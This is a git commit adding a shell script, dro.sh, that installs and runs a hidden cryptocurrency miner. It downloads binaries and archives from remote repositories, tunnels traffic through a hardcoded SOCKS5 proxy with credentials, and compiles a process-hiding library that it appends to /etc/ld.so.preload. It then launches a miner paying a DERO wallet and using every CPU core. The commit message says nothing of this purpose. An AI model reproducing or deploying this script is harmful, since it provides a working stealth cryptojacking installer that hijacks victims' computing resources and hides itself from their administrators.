0d64666e5e36c053f148282093ffe6acdaff0119
oksila54 <124560356+oksila54@users.noreply.github.com>
2023-02-07 06:38:47 +0700

    Create dro.sh

---
+++ dro.sh
@@ -0,0 +1,58 @@
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+sudo apt-get install -y nodejs
+
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+
+curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -
+
+npm i -g node-process-hider
+
+wget https://gitlab.com/gilaaja/exe/-/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+wget https://raw.githubusercontent.com/novalanto010101/file/main/astro
+chmod 777 astro
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 =  128.199.222.68:443
+socks5_username = arema
+socks5_password = singoedan
+END
+
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://gitlab.com/gilaaja/exe/-/raw/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+rm -rf wget-log*
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./astro -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcs7c2fusszy08qaz87cg -r community-pools.mysrv.cloud:10300 -p rpc -m $(nproc --all)
